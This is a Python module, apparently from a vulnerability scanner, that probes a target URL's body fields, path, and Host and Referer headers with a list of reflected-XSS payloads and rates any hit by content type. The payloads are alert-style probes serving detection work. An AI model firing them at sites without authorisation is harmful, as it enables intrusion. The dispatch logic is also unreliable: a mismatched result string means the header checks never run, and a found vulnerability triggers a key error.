"""
Author: Ayush Bhandari
Email: ayushbhandariofficial@gmail.com
"""
import requests
import urllib.parse
import time

# Predefined XSS payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<ScRipT>alert(1);</ScRipT>",
    "<IMG SRC=\"javascript:alert(1);\">",
    "<ScRipT>alert`1`</ScRipT>",
    "%3cscript%3ealert(1)%3c%2fscript%3e",
    "<svg onload=alert(1)+",
    "<img src=xss onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg onload=confirm(1)>",
    "&lt;script&gt;alert(1)&lt;/script&gt;"
]
def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS
            impact = "Low"
        else:
            impact = "High"
    else:
        impact = "Low"

    return impact


def xss_payload_decode(payload):
    # Decode URL-encoded payloads
    return urllib.parse.unquote(payload)

def xss_post_method(url, method, headers, body):
    temp_body = {}
    for key, value in body.items():
        for payload in XSS_PAYLOADS:
            temp_body.update(body)
            temp_body[key] = payload
            response = requests.post(url, headers=headers, json=temp_body) if method.upper() in ['POST', 'PUT'] else requests.get(url, headers=headers)
            decoded_payload = xss_payload_decode(payload)
            if decoded_payload in response.text:
                impact = check_xss_impact(response.headers)
                print(f"{url} is vulnerable to XSS")
                return {
                    "url": url,
                    "alert": "Cross Site Scripting",
                    "impact": impact,
                    "req_headers": headers,
                    "req_body": temp_body,
                    "res_headers": response.headers,
                    "res_body": response.text
                }
    return {"result": "No vulnerabilities found"}

def xss_http_headers(url, method, headers, body):
    temp_headers = headers.copy()
    for payload in XSS_PAYLOADS:
        parsed_url = urllib.parse.urlparse(url)
        host_header = {"Host": f"{parsed_url.netloc}/{payload}"}
        temp_headers.update(host_header)
        response = requests.get(url, headers=temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if decoded_payload in response.text:
            impact = "Low"
            print(f"{url} is vulnerable to XSS via Host header")
            return {
                "url": url,
                "alert": "Cross Site Scripting via Host header",
                "impact": impact,
                "req_headers": temp_headers,
                "req_body": body,
                "res_headers": response.headers,
                "res_body": response.text
            }

        referer_header_value = f'https://github.com?test={payload}'
        referer_header = {"Referer": referer_header_value}
        temp_headers.update(referer_header)
        response = requests.get(url, headers=temp_headers)
        if decoded_payload in response.text:
            impact = "Low"
            print(f"{url} is vulnerable to XSS via Referer header")
            return {
                "url": url,
                "alert": "Cross Site Scripting via Referer header",
                "impact": impact,
                "req_headers": temp_headers,
                "req_body": body,
                "res_headers": response.headers,
                "res_body": response.text
            }

    return {"result": "No vulnerabilities found"}

def xss_get_url(url, method, headers, body):
    parsed_url = urllib.parse.urlparse(url)
    result = ''
    for payload in XSS_PAYLOADS:
        xss_request_url = requests.get(f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}/{payload}", headers=headers)
        decoded_payload = xss_payload_decode(payload)
        if decoded_payload in xss_request_url.text:
            impact = "Low"
            print(f"{url} is vulnerable to XSS via URL")
            return {
                "url": url,
                "alert": "Cross Site Scripting",
                "impact": impact,
                "req_headers": headers,
                "req_body": body,
                "res_headers": xss_request_url.headers,
                "res_body": xss_request_url.text
            }
    return {"result": "No vulnerabilities found"}

def xss_check(url, method, headers, body):
    if method.upper() in ['GET', 'DELETE']:
        result = xss_get_url(url, method, headers, body)
        if result["result"] == "No XSS vulnerabilities detected":
            result = xss_http_headers(url, method, headers, body)

    elif method.upper() in ['POST', 'PUT']:
        result = xss_post_method(url, method, headers, body)

    return result

# # Example usage
# if __name__ == "__main__":
#     url = "http://example.com"
#     method = "POST"
#     headers = {"Content-Type": "application/json"}
#     body = {"key": "value"}
#
#     result = xss_check(url, method, headers, body)
#     print(result)
